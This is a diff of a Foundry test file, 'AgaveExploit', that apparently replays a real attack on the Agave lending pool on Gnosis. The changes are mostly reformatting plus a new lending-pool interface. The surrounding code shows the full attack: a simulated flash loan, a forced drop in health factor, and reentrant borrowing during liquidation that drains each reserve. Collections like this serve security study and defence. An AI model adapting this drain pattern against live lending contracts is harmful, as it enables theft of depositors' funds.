@@ -2,12 +2,62 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
+import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+import {ILendingPool, DataTypesAave} from "src/interfaces/ILendingPool.sol";
 
 interface IGnosisBridgedAsset is IERC20 {
-
     function mint(address, uint256) external returns (bool);
+}
 
+interface ILendingPoolAddressesProvider {
+    event MarketIdSet(string newMarketId);
+    event LendingPoolUpdated(address indexed newAddress);
+    event ConfigurationAdminUpdated(address indexed newAddress);
+    event EmergencyAdminUpdated(address indexed newAddress);
+    event LendingPoolConfiguratorUpdated(address indexed newAddress);
+    event LendingPoolCollateralManagerUpdated(address indexed newAddress);
+    event PriceOracleUpdated(address indexed newAddress);
+    event LendingRateOracleUpdated(address indexed newAddress);
+    event ProxyCreated(bytes32 id, address indexed newAddress);
+    event AddressSet(bytes32 id, address indexed newAddress, bool hasProxy);
+
+    function getMarketId() external view returns (string memory);
+
+    function setMarketId(string calldata marketId) external;
+
+    function setAddress(bytes32 id, address newAddress) external;
+
+    function setAddressAsProxy(bytes32 id, address impl) external;
+
+    function getAddress(bytes32 id) external view returns (address);
+
+    function getLendingPool() external view returns (address);
+
+    function setLendingPoolImpl(address pool) external;
+
+    function getLendingPoolConfigurator() external view returns (address);
+
+    function setLendingPoolConfiguratorImpl(address configurator) external;
+
+    function getLendingPoolCollateralManager() external view returns (address);
+
+    function setLendingPoolCollateralManager(address manager) external;
+
+    function getPoolAdmin() external view returns (address);
+
+    function setPoolAdmin(address admin) external;
+
+    function getEmergencyAdmin() external view returns (address);
+
+    function setEmergencyAdmin(address admin) external;
+
+    function getPriceOracle() external view returns (address);
+
+    function setPriceOracle(address priceOracle) external;
+
+    function getLendingRateOracle() external view returns (address);
+
+    function setLendingRateOracle(address lendingRateOracle) external;
 }
 
 // @KeyInfo - Total Lost : ~1.5M US$
@@ -43,7 +93,6 @@ Note: These concise steps outline the specific actions taken in each phase of th
 */
 
 contract AgaveExploit is Test {
-
     //Prepare numbers
     uint256 linkLendNum1 = 1_000_000_000_000_000_100;
     uint256 wethlendnum2 = 1;
@@ -97,13 +146,19 @@ contract AgaveExploit is Test {
         WETH.approve(address(lendingPool), type(uint256).max);
     }
 
-    function _getAvailableLiquidity(address asset) internal view returns (uint256 reserveTokenbal) {
-        DataTypesAave.ReserveData memory data = lendingPool.getReserveData(asset);
+    function _getAvailableLiquidity(
+        address asset
+    ) internal view returns (uint256 reserveTokenbal) {
+        DataTypesAave.ReserveData memory data = lendingPool.getReserveData(
+            asset
+        );
         reserveTokenbal = IERC20(asset).balanceOf(address(data.aTokenAddress));
     }
 
     function _getHealthFactor() internal view returns (uint256) {
-        (,,,,, uint256 healthFactor) = lendingPool.getUserAccountData(address(this));
+        (, , , , , uint256 healthFactor) = lendingPool.getUserAccountData(
+            address(this)
+        );
         return healthFactor;
     }
 
@@ -156,15 +211,29 @@ contract AgaveExploit is Test {
     }
 
     function _flashWETH() internal {
-        uniswapV2Call(address(this), ethFlashloanAmt, 0, abi.encode(msg.sender));
+        uniswapV2Call(
+            address(this),
+            ethFlashloanAmt,
+            0,
+            abi.encode(msg.sender)
+        );
     }
 
-    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes memory _data) public {
+    function uniswapV2Call(
+        address _sender,
+        uint256 _amount0,
+        uint256 _amount1,
+        bytes memory _data
+    ) public {
         //We simulate a flashloan from uniswap for initial eth funding
         _attackLogic(_amount0, _amount1, _data);
     }
 
-    function _attackLogic(uint256 _amount0, uint256 _amount1, bytes memory _data) internal {
+    function _attackLogic(
+        uint256 _amount0,
+        uint256 _amount1,
+        bytes memory _data
+    ) internal {
         //This will fast forward block number and timestamp to cause hf to be lower due to interest on loan pushing hf below one
         vm.warp(block.timestamp + 1 hours);
         vm.roll(block.number + 1);
@@ -179,11 +248,17 @@ contract AgaveExploit is Test {
     function _borrow(address asset) internal {
         uint256 reserveTokenbal = _getAvailableLiquidity(asset);
         uint256 BorrowAmount = reserveTokenbal > 2 ? reserveTokenbal - 1 : 0;
-        if (BorrowAmount > 0) lendingPool.borrow(asset, BorrowAmount, 2, 0, address(this));
+        if (BorrowAmount > 0)
+            lendingPool.borrow(asset, BorrowAmount, 2, 0, address(this));
     }
 
     function borrowTokens() internal {
-        lendingPool.deposit(weth, WETH.balanceOf(address(this)) - 1, address(this), 0);
+        lendingPool.deposit(
+            weth,
+            WETH.balanceOf(address(this)) - 1,
+            address(this),
+            0
+        );
         _borrow(usdc);
         _borrow(link);
         _borrow(wbtc);
@@ -193,7 +268,11 @@ contract AgaveExploit is Test {
         lendingPool.borrow(weth, wethLiqBeforeHack, 2, 0, address(this));
     }
 
-    function onTokenTransfer(address _from, uint256 _value, bytes memory _data) external {
+    function onTokenTransfer(
+        address _from,
+        uint256 _value,
+        bytes memory _data
+    ) external {
         //we only do the borrow call on liquidation call which is the second time the from is weth and value is 1
         if (_from == aweth && _value == 1) {
             callCount++;
@@ -202,5 +281,4 @@ contract AgaveExploit is Test {
             borrowTokens();
         }
     }
-
 }
